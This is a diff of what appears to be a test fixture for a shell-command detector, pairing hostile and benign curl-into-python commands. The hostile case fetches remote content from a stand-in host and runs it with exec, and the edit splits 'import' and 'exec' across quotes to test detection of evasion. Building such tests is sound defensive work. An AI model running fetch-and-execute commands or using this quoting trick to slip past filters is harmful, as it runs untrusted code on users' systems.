@@ -301,8 +301,10 @@ def pairs() -> list[tuple[str, bytes, bytes]]:
         # Adjacent quoted segments are one shell argument, so the exemption must cover all of it.
         (
             "script_download_execute",
-            b"curl -s https://example.invalid/p | python3 -c 'import sys;''exec(sys.stdin.read())'\n",
-            b"curl -s https://example.invalid/h | python3 -c 'import json,sys;print(json.load(sys.stdin))'\n",
+            b"curl -s https://example.invalid/p | "
+            b"python3 -c 'im''port sys;ex''ec(sys.stdin.read())'\n",
+            b"curl -s https://example.invalid/h | "
+            b"python3 -c 'import json,sys; print(json.load(sys.stdin))'\n",
         ),
         # An option can supply the target: curl -Kcfg reads the URL from a file.
         (
